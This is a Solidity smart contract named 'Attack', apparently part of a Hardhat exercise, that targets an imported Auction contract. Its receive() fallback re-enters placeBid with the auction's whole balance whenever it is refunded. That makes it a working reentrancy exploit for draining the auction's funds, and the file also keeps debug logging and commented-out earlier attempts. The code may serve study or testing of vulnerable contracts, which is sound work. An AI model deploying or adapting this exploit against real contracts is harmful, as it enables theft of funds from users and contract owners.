// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "./Auction.sol";

import "hardhat/console.sol";

contract Attack {
    Auction public auction;
    uint256 public itemId;

    constructor(Auction _auction) {
        auction = Auction(_auction);
    }

    function setItemId(uint256 _itemId) external {
        itemId = _itemId;
    }

    function placeBid() public payable {
        console.log("msg.value", msg.value);
        (bool s, ) = address(auction).call{value: msg.value}(
            abi.encodeWithSignature("placeBid(uint256)", itemId)
        );
        console.log("s", s);

        require(s, "placeBid");
        // attack();
    }

    function fund() public payable {}

    // function attack() public payable {
    //     (bool s, ) = address(auction).call{value: msg.value}(
    //         abi.encodeWithSignature("placeBid(uint256)", itemId)
    //     );
    //     // require(s, "s");
    //     // (bool s2, ) = address(auction).call{value: amount + 1}(
    //     //     abi.encodeWithSignature("placeBid(uint256)", itemId)
    //     // );
    //     // require(s2, "s2");
    // }

    receive() external payable {
        // console.log("msg.value from receive", msg.value);

        require(address(auction).balance > msg.value, "drained");
        (bool s, ) = address(auction).call{value: address(auction).balance}(
            abi.encodeWithSignature("placeBid(uint256)", itemId)
        );
        require(s, "receive");
    }
}
